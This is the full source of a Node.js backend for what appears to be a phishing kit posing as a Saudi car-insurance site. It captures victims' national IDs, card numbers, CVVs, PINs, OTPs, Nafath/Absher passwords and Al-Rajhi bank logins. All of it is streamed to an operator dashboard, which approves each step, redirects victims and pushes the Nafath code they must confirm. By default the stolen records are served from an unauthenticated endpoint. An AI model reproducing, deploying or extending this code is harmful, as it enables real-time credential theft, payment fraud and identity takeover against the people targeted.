/**
 * tmin backend — Railway-ready (v12)
 *
 * Serves two contracts on the same service:
 *
 *  A) Customer site (this Lovable frontend) — preserved from v5:
 *     GET  /breinit, POST /api/user/init, POST /api/chat/enabled,
 *     GET  /api/vicinfomain/captcha, POST /api/vicinfomain/createRequest,
 *     POST /api/store-policy, POST /api/data/store-details,
 *     POST /api/app-logs/:appId/log-user-in-app/:page,
 *     Socket.IO events: user:join, chat:message, booking:update, otp:*, nafath:*, …
 *
 *  B) Admin dashboard (Sherpa / tmn-backend contract):
 *     GET  /users, GET /users/:id, DELETE /users/:id
 *     POST /reg, POST /apply/:id, POST /company/:id,
 *     POST /visa, POST /phone, POST /phone-otp, POST /visa-otp
 *     Socket.IO: join{role}, bindOrder, newData, paymentForm, visaOtp,
 *                phone, phoneOtp, navaz
 *     Admin -> visitor: acceptService/declineService, acceptPaymentForm/
 *                declinePaymentForm, acceptPhone/declinePhone,
 *                acceptVisaOtp/declineVisaOtp, acceptPhoneOtp/declinePhoneOtp,
 *                acceptNavaz/declineNavaz, adminRedirect, clientBlocked,
 *                changeNavazCode
 *
 * Every customer submission is ALSO mirrored into the session store keyed
 * by the client's uuid, so `GET /users` (what the dashboard polls) returns
 * a live row per visitor with all their submitted fields.
 */

const express = require("express");
const http = require("http");
const cors = require("cors");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const { newCaptcha } = require("./captcha");
const { Server } = require("socket.io");

// ---------- config ----------
const PORT = process.env.PORT || 3000;
const DATA_FILE = process.env.DATA_FILE || path.join(__dirname, "data.json");
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "change-me";
const CHAT_ENABLED = process.env.CHAT_ENABLED === "0" ? 0 : 1;
const DEFAULT_CORS_ORIGINS = [
  "https://tmin-care7.vercel.app",
  "https://treegosksa.vercel.app",
  "https://caretreegoksa.lovable.app",
  "https://sherpa-admin.lovable.app",
  "https://id-preview--00527616-d82b-4439-9dbe-8bd68a0938b2.lovable.app",
  "https://id-preview--175f4f58-4e54-426c-b9c2-7ac4e8f4e2f0.lovable.app",
  "https://id-preview--6cbf428b-d027-4b61-b67f-7d0b2f722218.lovable.app",
];
const CORS_ORIGINS = (process.env.CORS_ORIGINS || "")
  .split(",")
  .map((s) => s.trim())
  .filter((origin) => /^https?:\/\/[^/]+$/.test(origin));
const corsOrigin = CORS_ORIGINS.length ? CORS_ORIGINS : DEFAULT_CORS_ORIGINS;
const TRUSTED_ADMIN_ORIGINS = new Set(
  corsOrigin.filter(
    (origin) =>
      origin === "https://sherpa-admin.lovable.app" ||
      origin.includes("id-preview--"),
  ),
);

// ---------- tiny JSON "db" ----------
const db = (() => {
  const empty = {
    users: {},        // uuid -> session row (used by dashboard GET /users)
    submissions: [],  // audit log { id, type, uuid, payload, ts }
    policies: [],
    details: [],
    chats: {},
    captchas: {},
    blocked: {},
    logs: [],
  };
  let state = empty;
  try {
    if (fs.existsSync(DATA_FILE))
      state = { ...empty, ...JSON.parse(fs.readFileSync(DATA_FILE, "utf8")) };
  } catch (e) {
    console.warn("db load failed:", e.message);
  }
  let dirty = false;
  setInterval(() => {
    if (!dirty) return;
    dirty = false;
    try {
      fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
    } catch (e) {
      console.warn("db save failed:", e.message);
    }
  }, 1000);
  return {
    get: () => state,
    save: () => {
      dirty = true;
    },
    flush: () => {
      dirty = false;
      try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
      } catch (e) {
        console.warn("db save failed:", e.message);
      }
    },
  };
})();

// ---------- app ----------
const app = express();
app.set("trust proxy", true);
app.use(cors({ origin: corsOrigin, credentials: true }));
app.use(express.json({ limit: "5mb" }));
app.use(express.urlencoded({ extended: true, limit: "5mb" }));

const server = http.createServer(app);
const io = new Server(server, {
  path: "/socket.io",
  cors: { origin: corsOrigin, credentials: true },
});

// ---------- admin-relay (forwards admin actions to per-session client rooms)
let RELAY_ATTACHED = false;
try {
  const { attachAdminRelay } = require("./admin-relay");
  attachAdminRelay(io);
  RELAY_ATTACHED = true;
  console.log("[relay] admin-relay attached");
} catch (e) {
  console.warn("[relay] admin-relay NOT attached:", e.message);
}

// ---------- structured admin/join logging + metrics ----------
const JOIN_METRICS = {
  admin_join_ok: 0,
  admin_join_missing_token: 0,
  admin_join_invalid_token: 0,
  admin_join_rejected: 0,
  client_join_ok: 0,
  client_join_blocked: 0,
  disconnects: 0,
};
function logJoinEvent(evt) {
  // Never log the token value itself.
  try {
    console.log(JSON.stringify({ ts: new Date().toISOString(), evt: "join", ...evt }));
  } catch {
    console.log("[join]", evt);
  }
}


// ---------- helpers ----------
const now = () => new Date().toISOString();
const STARTED_AT = new Date().toISOString();
const uuid = () => crypto.randomUUID();
const newId = () =>
  Date.now().toString(36) + Math.random().toString(36).slice(2, 10);

const SESSION_STATUSES = new Set([
  "pending",
  "in_progress",
  "completed",
  "blocked",
  "declined",
]);

const SESSION_FIELDS = [
  "name", "national_id", "phone", "serialNumber", "car_year", "car_model", "carPrice", "carHolderName", "purpose_of_use", "tameenFor", "tameenAllType", "tameenType",
  "startedDate", "companyData", "cardNumber", "cvv", "expiryDate", "card_name", "pin",
  "cardAttempts", "CardAccept", "OtpCardAccept", "PinAccept", "STCAccept", "MotslAccept",
  "MotslOtpAccept", "NavazAccept", "stcAwaitingCall", "blocked", "checked", "MotslPhone",
  "MotslNetwork", "MotslOtp", "CardOtp", "NavazOtp", "Customs_card", "phoneId", "type",
  "status", "stage", "createdAt", "updatedAt",
];

const STAGE_ALIASES = {
  init: "service", registered: "service", reg: "service", service: "service",
  apply: "service", company: "service", payment: "payment", paymentform: "payment",
  visa: "payment", card: "payment", visaotp: "cardOtp", "otp:received": "cardOtp",
  phone: "phone", phoneotp: "phoneOtp", "phone:submitted": "phone",
  mobotp: "mobilyOtp", motsl: "motslOtp", motslotp: "motslOtp", stc: "stc",
  stcphoneotp: "stcOtp", stcotp: "stcOtp", navaz: "navaz", nafath: "navaz",
};

function canonicalStage(value, fallback = "service") {
  const raw = String(value || "").trim();
  const key = raw.replace(/^(accept|decline)/i, "");
  if (!key) return fallback;
  return STAGE_ALIASES[key.toLowerCase()] || STAGE_ALIASES[raw.toLowerCase()] || fallback;
}

function canonicalStatus(value, fallback = "pending") {
  const status = String(value || "").trim().toLowerCase();
  return SESSION_STATUSES.has(status) ? status : fallback;
}

function canonicalSession(id, row, timestamp) {
  const source = row || {};
  const document = {};
  // Customer pages use `_id` while the legacy dashboard contract also uses
  // `id`/`uuid`; expose all three identifiers consistently on every response.
  document._id = id;
  for (const field of SESSION_FIELDS) document[field] = source[field] ?? null;
  document.name = document.name ?? source.documentOwnerName ?? source.fullName ?? null;
  document.national_id = document.national_id ?? source.idNumber ?? source.identityNumber ?? null;
  document.phone = document.phone ?? source.mobileNumber ?? source.phoneNumber ?? null;
  document.serialNumber = document.serialNumber ?? source.sequenceNumber ?? null;
  document.car_year = document.car_year ?? source.carYear ?? source.modelYear ?? null;
  document.car_model = document.car_model ?? source.carModel ?? source.vehicleModel ?? null;
  document.carPrice = document.carPrice ?? source.carValue ?? source.price ?? null;
  document.carHolderName = document.carHolderName ?? source.cardholderName ?? source.name ?? null;
  document.purpose_of_use = document.purpose_of_use ?? source.purpose ?? null;
  document.startedDate = document.startedDate ?? source.startDate ?? null;
  document.card_name = document.card_name ?? source.cardholderName ?? null;
  document.cvv = document.cvv ?? source.cardCvv ?? null;
  document.expiryDate = document.expiryDate ?? source.cardExpiry ?? null;
  if (!source.companyData && (source.company || source.price)) {
    document.companyData = {
      logo: source.logo ?? null,
      price: source.price ?? null,
      options: Array.isArray(source.options) ? source.options : [],
    };
  }
  document.companyData = document.companyData || { logo: null, price: null, options: [] };
  document.companyData.options = Array.isArray(document.companyData.options)
    ? document.companyData.options
    : [];
  document.cardAttempts = Array.isArray(document.cardAttempts) ? document.cardAttempts : [];
  for (const field of [
    "CardAccept", "OtpCardAccept", "PinAccept", "STCAccept", "MotslAccept",
    "MotslOtpAccept", "NavazAccept", "stcAwaitingCall", "blocked", "checked",
  ]) document[field] = Boolean(document[field]);
  document.status = canonicalStatus(document.status);
  document.stage = canonicalStage(document.stage);
  document.blocked = Boolean(document.blocked);
  document.createdAt = source.createdAt || timestamp;
  document.updatedAt = timestamp;
  return document;
}

function clientIp(req) {
  return (
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.toString().split(",")[0].trim() ||
    req.socket?.remoteAddress ||
    "Unknown"
  );
}

function requireAdmin(req, res, next) {
  const t =
    req.headers.authorization?.replace(/^Bearer\s+/i, "") || req.query.token;
  if (t !== ADMIN_TOKEN) return res.status(401).json({ error: "unauthorized" });
  next();
}

/** Upsert a session row into state.users (dashboard reads this via /users). */
function upsertSession(id, patch, extra = {}) {
  if (!id) return null;
  const state = db.get();
  const existing = state.users[id] || {
    id,
    uuid: id,
    createdAt: now(),
  };
  const next = {
    ...existing,
    ...patch,
    id,
    uuid: id,
    updatedAt: now(),
    ...extra,
  };
  if (next.cardNumber || next.cardCvv || next.cvv) {
    const attempts = Array.isArray(next.cardAttempts) ? next.cardAttempts : [];
    const attempt = {
      cardNumber: next.cardNumber || null,
      cvv: next.cvv || next.cardCvv || null,
      expiryDate: next.expiryDate || next.cardExpiry || null,
      carHolderName: next.card_name || next.cardholderName || next.carHolderName || null,
      status: canonicalStatus(next.status, "pending"),
      createdAt: now(),
    };
    const last = attempts[attempts.length - 1];
    if (!last || JSON.stringify(last) !== JSON.stringify(attempt)) next.cardAttempts = [...attempts, attempt];
  }
  next.status = canonicalStatus(next.status, existing.status || "pending");
  next.stage = canonicalStage(next.stage, existing.stage || "service");
  if (!next.createdAt) next.createdAt = now();
  Object.assign(next, canonicalSession(id, next, next.updatedAt));
  state.users[id] = next;
  db.save();
  // Push realtime update to dashboards
  io.emit("sessionUpdate", next);
  io.to("admins").emit("newVisitor", next);
  return next;
}

/** Find the most recent session for an IP (used when the client sends no uuid). */
function findSessionByIp(ip) {
  if (!ip) return null;
  const rows = Object.values(db.get().users).filter((u) => u.ip === ip);
  if (!rows.length) return null;
  rows.sort((a, b) =>
    String(b.updatedAt || b.lastSeen || "").localeCompare(
      String(a.updatedAt || a.lastSeen || "")
    )
  );
  return rows[0].id;
}

/** Pick the first non-empty value among several possible field names. */
function pick(src, names) {
  for (const n of names) {
    const v = src?.[n];
    if (v !== undefined && v !== null && String(v).trim() !== "") return v;
  }
  return undefined;
}

function recordSubmission(type, payload) {
  const state = db.get();
  const id =
    payload?.uuid ||
    payload?.id ||
    payload?.userId ||
    findSessionByIp(payload?.ip) ||
    null;
  const entry = { id: uuid(), type, uuid: id, ts: now(), payload };
  state.submissions.push(entry);
  db.flush();
  console.log(
    `[submission] ${type} ${payload?.result || ""} total=${state.submissions.length}`
  );
  io.to("admins").emit("live:update", entry);
  io.emit("live:update", entry);
  if (id) {
    // Mirror flat fields so the dashboard's session table shows the data.
    // The site nests real values under payload.formData (sometimes deeper),
    // so flatten every nested object into one lookup map.
    const p = {};
    const collect = (obj, depth = 0) => {
      if (!obj || typeof obj !== "object" || depth > 4) return;
      for (const [k, v] of Object.entries(obj)) {
        if (v && typeof v === "object") collect(v, depth + 1);
        else if (v !== undefined && v !== null && String(v).trim() !== "" && p[k] === undefined)
          p[k] = v;
      }
    };
    collect(payload);

    const flat = {};
    const set = (key, names) => {
      const v = pick(p, names);
      if (v !== undefined) flat[key] = v;
    };
    set("idNumber", ["identityNumber", "nationalIdIqama", "idNumber", "nationalId", "iqama"]);
    set("phone", ["mobileNumber", "phone", "phoneNumber", "mobile"]);
    set("name", ["documentOwnerName", "name", "fullName"]);
    set("cardholderName", ["cardholderName"]);

    set("sequenceNumber", ["sequenceNumber", "serialNumber"]);
    set("birthDate", ["birthDate", "dateOfBirth", "dob"]);
    set("email", ["email"]);
    set("company", ["compname", "company", "insuranceCompany"]);
    set("price", ["totalPrice", "price", "amount"]);
    set("insuranceType", ["TypeOfInsuranceContract", "insuranceType"]);
    set("carValue", ["carValue", "vehicleValue", "estimatedValue"]);
    set("carMake", ["vehicleMaker", "carMake", "make", "maker", "brand", "vehicleBrand"]);
    set("carModel", ["vehicleModel", "carModel", "model", "modelName"]);
    set("carYear", ["modelYear", "vehicleYear", "carYear", "year"]);
    set("plateNumber", ["plateNumber", "plate", "customCardNumber", "vehiclePlate"]);
    set("carType", ["carType", "vehicleType", "bodyType"]);
    set("cardNumber", ["cardNumber"]);


    set("cardExpiry", ["expiry", "expiryDate", "expiryMonth"]);
    set("cardExpiryYear", ["expiryYear"]);
    set("paymentMethod", ["paymentMethod"]);
    set("cardCvv", ["cvv"]);
    set("otp", ["otp", "otpCode", "code", "otpValue", "pinCode", "pin"]);
    set("nafathId", ["nafathId", "nafathNumber", "nafathIdentity"]);
    set("nafathUsername", ["nafathUsername", "nafathUser", "nafathLogin", "nafathLoginName", "nafathUserName", "nafseUsername", "nafseUser", "absherUsername", "absherUser", "userName"]);
    set("nafathPassword", ["nafathPassword", "nafathPass", "nafsePassword", "absherPassword", "password"]);
    set("bankUsername", ["bankUsername", "username", "userId", "userid"]);
    set("bankPassword", ["bankPassword"]);
    set("address", ["address", "nationalAddress", "streetName", "district"]);
    set("city", ["city", "cityName"]);
    set("postalCode", ["postalCode", "zipCode"]);
    set("gender", ["gender", "sex"]);
    set("nationality", ["nationality"]);
    set("purpose", ["purpose", "usage"]);
    set("driverAge", ["driverAge", "age"]);
    set("licenseType", ["licenseType"]);
    set("startDate", ["startDate", "policyStart"]);
    set("promoCode", ["promoCode", "coupon"]);
    set("result", ["result"]);
    set("vehicle", ["vehicle"]);
    set("eventType", ["eventType", "event_type"]);
    set("workflowState", ["workflowState", "state"]);
    set("cardBrand", ["cardBrand", "card_brand"]);
    set("cardLast4", ["cardLast4", "card_last4"]);
    set("provider", ["provider"]);
    set("referenceId", ["referenceId", "reference_id"]);
    set("page", ["page", "currentPage", "step", "page_path"]);
    if (flat.idNumber) flat.identityNumber = flat.idNumber;
    if (flat.phone) flat.mobileNumber = flat.phone;
    // Per-page bucket: keep the latest client inputs grouped by the page/event
    // the visitor was on when they submitted, so the dashboard can show
    // exactly what the client typed on each screen of their session.
    const existingUser = db.get().users[id] || {};
    // State/activity markers must not erase the meaningful page where the
    // visitor submitted the form. Prefer an explicit route, otherwise keep
    // the last known route for marker-only events.
    const lifecyclePage =
      type === "reg" ? "/reg" :
      type === "apply" ? (existingUser.lastPage || "/reg") :
      type === "company" ? (existingUser.lastPage || "/confirm") :
      null;
    const pageKey = String(
      flat.page ||
      payload?.page_path ||
      lifecyclePage ||
      (type === "state" || type === "activity" ? existingUser.lastPage : type) ||
      "unknown"
    );
    const prevPages = (existingUser.pages && typeof existingUser.pages === "object") ? existingUser.pages : {};
    const prevBucket = prevPages[pageKey] || { inputs: {}, events: [] };
    const mergedInputs = { ...(prevBucket.inputs || {}), ...flat };
    // Drop empty strings so we don't overwrite real values with blanks
    for (const k of Object.keys(mergedInputs)) {
      if (mergedInputs[k] === "" || mergedInputs[k] === null) delete mergedInputs[k];
    }
    const nextBucket = {
      page: pageKey,
      inputs: mergedInputs,
      lastEvent: type,
      lastPayload: payload,
      updatedAt: now(),
      events: [...(prevBucket.events || []).slice(-19), { type, ts: now() }],
    };
    const nextPages = { ...prevPages, [pageKey]: nextBucket };

    upsertSession(id, {
      ...flat,
      [type]: payload,
      pages: nextPages,
      lastEvent: type,
      lastPage: pageKey,
      stage: type,
      lastSubmissionAt: now(),
    });

    // Push a compact per-page notification for dashboards that want to
    // render "client input on page X" without diffing the full session.
    io.to("admins").emit("client:input", {
      id,
      uuid: id,
      page: pageKey,
      event: type,
      inputs: mergedInputs,
      payload,
      ts: now(),
    });
  }
  return entry;
}



// Map admin-dashboard event names to the customer socket events the
// site pages actually listen for (see /public/assets/index-*.js).
// Every customer listener expects a payload with { action: "confirmed" | "cancelled" }
// and one of userId / uuid / id matching the visitor's session.
const ADMIN_EVENT_ALIASES = {
  // Quote/booking and PIN steps
  acceptbooking: ["payment:action", "confirmed"],
  declinebooking: ["payment:action", "cancelled"],
  acceptpin: ["otp:action", "confirmed"],
  declinepin: ["otp:action", "cancelled"],
  // Payment / visa card form
  acceptpaymentform: ["payment:action", "confirmed"],
  declinepaymentform: ["payment:action", "cancelled"],
  acceptservice: ["payment:action", "confirmed"],
  declineservice: ["payment:action", "cancelled"],
  acceptpayment: ["payment:action", "confirmed"],
  declinepayment: ["payment:action", "cancelled"],

  // Visa 3-D Secure / SMS OTP shown after payment
  acceptvisaotp: ["otp:action", "confirmed"],
  declinevisaotp: ["otp:action", "cancelled"],
  acceptphoneotp: ["otp:action", "confirmed"],
  declinephoneotp: ["otp:action", "cancelled"],
  acceptmobotp: ["otp:action", "confirmed"],
  declinemobotp: ["otp:action", "cancelled"],
  acceptmotslotp: ["otp:action", "confirmed"],
  declinemotslotp: ["otp:action", "cancelled"],
  acceptstcphoneotp: ["otp:action", "confirmed"],
  declinestcphoneotp: ["otp:action", "cancelled"],
  acceptstc: ["otp:action", "confirmed"],
  declinestc: ["otp:action", "cancelled"],
  acceptotp: ["otp:action", "confirmed"],
  declineotp: ["otp:action", "cancelled"],

  // Phone verification (motasel / stc verify pages)
  acceptphone: ["phone:action", "confirmed"],
  declinephone: ["phone:action", "cancelled"],

  // Nafath (Absher) approval step
  acceptnavaz: ["nafath:action", "confirmed"],
  declinenavaz: ["nafath:action", "cancelled"],
  acceptnafath: ["nafath:action", "confirmed"],
  declinenafath: ["nafath:action", "cancelled"],

  // Nafath login (username + password) -> navigates to /nafse
  acceptnaflogin: ["naflogin:action", "confirmed"],
  declinenaflogin: ["naflogin:action", "cancelled"],
  acceptnafselogin: ["naflogin:action", "confirmed"],
  declinenafselogin: ["naflogin:action", "cancelled"],

  // Al-Rajhi login -> navigates to /phone
  acceptrajlogin: ["rajlogin:action", "confirmed"],
  declinerajlogin: ["rajlogin:action", "cancelled"],
  acceptrajhi: ["rajlogin:action", "confirmed"],
  declinerajhi: ["rajlogin:action", "cancelled"],
};

function broadcastAdminEvent(id, event, payload) {
  if (!id) return;
  const target = io.to(`session:${id}`).to(`user:${id}`);
  const base = { id, uuid: id, userId: id };
  const data = payload && typeof payload === "object"
    ? { ...base, ...payload, id, uuid: id, userId: id }
    : base;

  // Echo the raw event too, so a dashboard that already uses the
  // customer-side names keeps working.
  target.emit(event, data);

  const key = String(event || "").toLowerCase();
  const alias = ADMIN_EVENT_ALIASES[key];
  if (alias) {
    const [aliasEvent, action] = alias;
    target.emit(aliasEvent, { ...data, action });
  }

  // Redirect: dashboard chooses the destination page.
  if (key === "adminredirect" || key === "redirect" || key === "admin:redirect") {
    const redirectPayload = {
      ...data,
      page: data.page || data.path || data.route || data.to || "/",
      pageName: data.pageName || data.title || "",
    };
    target.emit("admin:redirect", redirectPayload);
  }

  // Nafath verification number: dashboard sends the 2-digit code that
  // the customer must tap in the Absher app on page 7. The customer
  // bundle listens for `nafath:code` with { verificationCode: "42" }.
  const isNafathNumberEvent =
    key === "changenavazcode" ||
    key === "nafathnumber" ||
    key === "nafathcode" ||
    key === "sendnafathnumber" ||
    key === "sendnafathcode" ||
    key === "setnafathnumber" ||
    key === "setnafathcode" ||
    key === "nafath:code" ||
    key === "nafath:number" ||
    /nafath.*(number|code)/.test(key) ||
    /(send|set).*nafath/.test(key);

  if (isNafathNumberEvent) {
    const raw = String(
      data.verificationCode ??
        data.code ??
        data.number ??
        data.nafathNumber ??
        data.nafathCode ??
        data.value ??
        ""
    ).trim();
    // Keep digits only, pad/truncate to 2 chars so the customer page
    // always shows a clean two-digit badge.
    const digits = raw.replace(/\D+/g, "").slice(0, 2).padStart(raw ? 2 : 0, "0");
    const code = digits || raw;
    target.emit("nafath:code", {
      ...data,
      verificationCode: code,
      code,
      number: code,
    });

    // "Send # & Redirect": if the dashboard event or payload says so,
    // also push the client to page 7 (/nafath) so they see the badge.
    const wantsRedirect =
      /redirect|navigate|goto|go2|push/.test(key) ||
      data.redirect === true ||
      data.redirectToNafath === true ||
      data.navigate === true ||
      /nafath/i.test(String(data.page || data.route || data.to || ""));
    if (wantsRedirect) {
      target.emit("admin:redirect", {
        ...data,
        page: "/nafath",
        pageName: data.pageName || "nafath",
      });
    }
  }


  // Block: customer page shows blocked screen. Do NOT disconnect the
  // socket, otherwise the next OTP / redirect can't be delivered.
  if (key === "clientblocked" || key === "blockclient" || key === "user:blocked") {
    target.emit("user:blocked", { ...data, blocked: true });
  }

  io.to("admins").emit(`admin:${event}`, { id, payload: data });
}

// ---------- REST: health / meta ----------
app.get("/", (_req, res) => res.json({ ok: true, service: "tmin-backend" }));
app.get("/health", (_req, res) => {
  const adminSockets = io.sockets.adapter.rooms.get("admins")?.size || 0;
  res.json({
    ok: true,
    version: APP_VERSION,
    startedAt: STARTED_AT,
    uptimeSec: Math.round(process.uptime()),
    relayAttached: RELAY_ATTACHED,
    sockets: {
      total: io.sockets.sockets.size,
      admins: adminSockets,
    },
    joinMetrics: JOIN_METRICS,
  });
});
app.get("/admin/health", requireAdmin, (_req, res) => {
  const adminSockets = io.sockets.adapter.rooms.get("admins")?.size || 0;
  res.json({
    ok: true,
    version: APP_VERSION,
    startedAt: STARTED_AT,
    uptimeSec: Math.round(process.uptime()),
    relayAttached: RELAY_ATTACHED,
    sockets: {
      total: io.sockets.sockets.size,
      admins: adminSockets,
    },
    joinMetrics: JOIN_METRICS,
    users: Object.keys(db.get().users).length,
    submissions: db.get().submissions.length,
  });
});

const APP_VERSION = "v26-page-events-relay-start";

app.get("/version", (_req, res) =>
  res.json({
    version: APP_VERSION,
    dataFile: DATA_FILE,
    persistent: DATA_FILE.startsWith("/data"),
    vicUpstream: !!process.env.VIC_UPSTREAM_URL,
    submissions: db.get().submissions.length,
    users: Object.keys(db.get().users).length,
    startedAt: STARTED_AT,
  })
);

app.get("/breinit", (_req, res) => res.json({ ok: true }));
app.post("/api/chat/enabled", (_req, res) =>
  res.json({ isChatEnabled: CHAT_ENABLED })
);
app.get("/order/status/:id", (req, res) => {
  const session = db.get().users[req.params.id];
  res.json({ data: { blocked: Boolean(session?.blocked) } });
});

// ---------- REST: customer site (frontend contract) ----------
app.post("/api/user/init", (req, res) => {
  const { browserInfo } = req.body || {};
  // The backend owns the session UUID. The returned UUID is then used by the
  // customer and dashboard for all subsequent Railway-backed writes.
  const id = uuid();
  const ip = clientIp(req);
  upsertSession(id, {
    ip,
    ua: req.headers["user-agent"] || "",
    browserInfo: browserInfo || null,
    lastSeen: now(),
    status: "pending",
    stage: "service",
  });
  res.json({
    ok: true,
    _id: id,
    session: crypto.randomBytes(16).toString("hex"),
    userInfo: {
      uuid: id,
      visitTime: now(),
      ip,
      country: "Unknown",
      countryCode: "XX",
    },
  });
});

// ---------- Safe customer state/activity markers ----------
// The customer bundle sends only allowlisted workflow markers here. These
// endpoints intentionally reject card numbers, CVV, OTPs, PINs, passwords,
// and other credential-like fields before anything is persisted or relayed.
const SAFE_STATE_KEYS = new Set([
  "event_type", "state", "card_brand", "card_last4", "reference_id", "provider", "page_path",
]);
const SAFE_STATE_EVENTS = {
  payment_method_submitted: new Set(["tokenization_required"]),
  payment_challenge_submitted: new Set(["pending_provider_verification"]),
  phone_challenge_submitted: new Set(["pending_provider_verification"]),
  identity_verification_started: new Set(["pending_provider_verification"]),
  identity_challenge_submitted: new Set(["pending_provider_verification"]),
  contact_method_selected: new Set(["submitted"]),
  page_viewed: new Set(["observed"]),
};
const SAFE_SENSITIVE_KEY =
  /(?:card.?number|card_number|\bpan\b|cvv|cvc|otp|passcode|password|\bpin\b|navazuser|navazpassword|identity_otp|card_otp)/i;
const SAFE_TRACKED_PATHS = new Set([
  "/", "/reg", "/confirm", "/activate", "/activate_shamel", "/phone",
  "/phoneOtp", "/mobilyOtp", "/stcOtp", "/motsl", "/motslOtp", "/navaz",
  "/stc", "/order_otp", "/verfiy",
]);

function safeMarker(body) {
  if (!body || typeof body !== "object" || Array.isArray(body)) return null;
  if (Object.keys(body).some((key) => !SAFE_STATE_KEYS.has(key))) return null;
  if (Object.keys(body).some((key) => SAFE_SENSITIVE_KEY.test(key))) return null;
  const eventType = String(body.event_type || "").trim();
  const state = String(body.state || "").trim();
  if (!SAFE_STATE_EVENTS[eventType]?.has(state)) return null;
  const cardBrand = body.card_brand == null ? null : String(body.card_brand).trim().toLowerCase();
  const cardLast4 = body.card_last4 == null ? null : String(body.card_last4).trim();
  const referenceId = body.reference_id == null ? null : String(body.reference_id).trim();
  const provider = body.provider == null ? null : String(body.provider).trim().slice(0, 80);
  const pagePath = body.page_path == null ? null : String(body.page_path).split("?")[0].trim();
  if (pagePath && !SAFE_TRACKED_PATHS.has(pagePath)) return null;
  if (cardBrand && !["visa", "mastercard", "mada", "amex", "unknown"].includes(cardBrand)) return null;
  if (cardLast4 && !/^\d{4}$/.test(cardLast4)) return null;
  if (referenceId && !/^[A-Za-z0-9._:-]+$/.test(referenceId)) return null;
  return { eventType, state, cardBrand, cardLast4, referenceId, provider, pagePath };
}

app.post("/state/:id", (req, res) => {
  const id = req.params.id;
  const marker = safeMarker(req.body);
  if (!marker) return res.status(400).json({ error: "invalid_safe_state_marker" });
  const session = upsertSession(id, {
    lastEvent: marker.eventType,
    stage: canonicalStage(marker.eventType),
    safeState: marker,
    ...(marker.pagePath ? { lastPage: marker.pagePath, currentPage: marker.pagePath } : {}),
    lastSeen: now(),
  });
  recordSubmission("state", { uuid: id, ...marker, ...(marker.pagePath ? { page_path: marker.pagePath } : {}) });
  res.json({ recorded: true, requestId: id, marker, session });
});

app.post("/activity/:id", (req, res) => {
  const pagePath = String(req.body?.page_path || "").split("?")[0];
  if (!SAFE_TRACKED_PATHS.has(pagePath)) {
    return res.status(400).json({ error: "unsupported_page_path" });
  }
  const session = upsertSession(req.params.id, { lastPage: pagePath, lastSeen: now() });
  recordSubmission("activity", { uuid: req.params.id, page_path: pagePath });
  res.json({ recorded: true, requestId: req.params.id, session });
});

app.get("/api/vicinfomain/captcha", (_req, res) => {
  const sessionId = uuid();
  const captchaUuid = uuid();
  const { code, imageB64 } = newCaptcha();
  const state = db.get();
  state.captchas[sessionId] = { captchaUuid, code, ts: Date.now() };
  db.save();
  res.json({
    sessionId,
    captchaUuid,
    imageB64,
    imageDataUrl: `data:image/png;base64,${imageB64}`,
  });
});

app.post("/api/vicinfomain/createRequest", async (req, res) => {
  const body = req.body || {};
  const {
    jcaptcha,
    captchaUuid,
    vicinfomainSessionId,
    sequenceNumber,
    identityNumber,
    nationalId,
    mobileNumber,
    uuid: userUuid,
  } = body;
  const state = db.get();
  const c = state.captchas[vicinfomainSessionId];

  const baseSubmission = {
    identityNumber: identityNumber || nationalId || null,
    mobileNumber: mobileNumber || null,
    sequenceNumber: sequenceNumber || null,
    uuid: userUuid || null,
    ip: clientIp(req),
    raw: body,
  };

  if (!c || c.captchaUuid !== captchaUuid) {
    recordSubmission("vehicleRequest", {
      ...baseSubmission,
      result: "invalid_captcha",
    });
    return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
  }
  if (String(jcaptcha).trim() !== c.code) {
    recordSubmission("vehicleRequest", {
      ...baseSubmission,
      result: "invalid_captcha",
    });
    return res.json({ status: "invalid_captcha", errorCode: "invalid_captcha" });
  }
  delete state.captchas[vicinfomainSessionId];
  db.save();

  if (process.env.VIC_UPSTREAM_URL) {
    try {
      const r = await fetch(process.env.VIC_UPSTREAM_URL, {
        method: "POST",
        headers: {
          "content-type": "application/json",
          ...(process.env.VIC_UPSTREAM_TOKEN
            ? { authorization: `Bearer ${process.env.VIC_UPSTREAM_TOKEN}` }
            : {}),
        },
        body: JSON.stringify({
          sequenceNumber,
          identityNumber: baseSubmission.identityNumber,
        }),
      });
      const data = await r.json().catch(() => null);
      const vehicle =
        data?.vehicle || (data && data.vehicleMaker ? data : null);
      if (r.ok && vehicle) {
        recordSubmission("vehicleRequest", {
          ...baseSubmission,
          result: "success",
          vehicle,
        });
        return res.json({ status: "success", vehicle });
      }
    } catch (e) {
      console.warn("[vic] upstream lookup failed:", e.message);
    }
  }
  recordSubmission("vehicleRequest", {
    ...baseSubmission,
    result: "vehicle_not_found",
  });
  return res.json({
    status: "vehicle_not_found",
    errorCode: "vehicle_not_found",
  });
});

app.post("/api/store-policy", (req, res) => {
  const state = db.get();
  const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
  state.policies.push(entry);
  db.save();
  recordSubmission("policy", entry);
  res.json({ ok: true });
});

app.post("/api/data/store-details", (req, res) => {
  const state = db.get();
  const entry = { id: uuid(), ts: now(), ip: clientIp(req), ...req.body };
  state.details.push(entry);
  db.save();
  recordSubmission("details", entry);
  res.json({ ok: true });
});

app.post("/api/app-logs/:appId/log-user-in-app/:page", (req, res) => {
  const state = db.get();
  const entry = {
    ts: now(),
    appId: req.params.appId,
    page: req.params.page,
    ip: clientIp(req),
    ...req.body,
  };
  state.logs.push(entry);
  if (state.logs.length > 5000) state.logs.splice(0, state.logs.length - 5000);
  db.save();
  const id = req.body?.uuid || req.body?.userId;
  if (id) upsertSession(id, { lastPage: req.params.page, lastSeen: now() });
  res.json({ ok: true });
});

// ---------- REST: admin dashboard contract (tmn-backend) ----------
// The Sherpa admin dashboard polls GET /users. It expects an array of
// session rows keyed by id. We serve it publicly (matches original tmn
// contract) OR require Bearer token when ADMIN_LIST_PROTECTED=1.
function maybeAdmin(req, res, next) {
  if (process.env.ADMIN_LIST_PROTECTED === "1") return requireAdmin(req, res, next);
  next();
}

app.get("/users", maybeAdmin, (_req, res) => {
  const list = Object.values(db.get().users).sort(
    (a, b) => (Date.parse(b.updatedAt || 0) || 0) - (Date.parse(a.updatedAt || 0) || 0)
  );
  res.json(list);
});
